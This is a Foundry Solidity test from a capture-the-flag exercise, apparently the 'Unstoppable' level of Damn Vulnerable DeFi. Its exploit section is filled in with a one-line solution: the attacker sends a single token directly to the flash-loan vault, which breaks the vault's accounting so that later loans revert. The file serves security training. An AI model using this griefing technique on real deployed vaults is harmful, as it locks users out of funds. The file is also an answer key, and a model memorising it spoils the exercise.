// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableVault} from "../../../src/Contracts/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_VAULT = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 10e18;

    Utilities internal utils;
    UnstoppableVault internal unstoppableVault;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal deployer;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);
        deployer = users[0];
        attacker = users[1];
        someUser = users[2];
        vm.label(deployer, "Deployer");
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableVault = new UnstoppableVault(dvt, deployer, deployer);
        vm.label(address(unstoppableVault), "Unstoppable Lender");

        dvt.approve(address(unstoppableVault), TOKENS_IN_VAULT);
        unstoppableVault.deposit(TOKENS_IN_VAULT, deployer);

        assertEq(dvt.balanceOf(address(unstoppableVault)), TOKENS_IN_VAULT);
        assertEq(unstoppableVault.totalAssets(), TOKENS_IN_VAULT);
        assertEq(unstoppableVault.totalSupply(), TOKENS_IN_VAULT);
        assertEq(unstoppableVault.maxFlashLoan(address(dvt)), TOKENS_IN_VAULT);
        assertEq(unstoppableVault.flashFee(address(dvt), TOKENS_IN_VAULT - 1), 0);
        assertEq(unstoppableVault.flashFee(address(dvt), TOKENS_IN_VAULT), 50000 * 10 ** 18);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableVault)), TOKENS_IN_VAULT);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableVault)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(100 * 10 ** 18);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        // Add funds to the vault, so the actual token balance is higher than expected totalSupply
        dvt.transfer(address(unstoppableVault), 1);
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        vm.expectRevert();
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(100 * 10 ** 18);
        vm.stopPrank();
    }
}
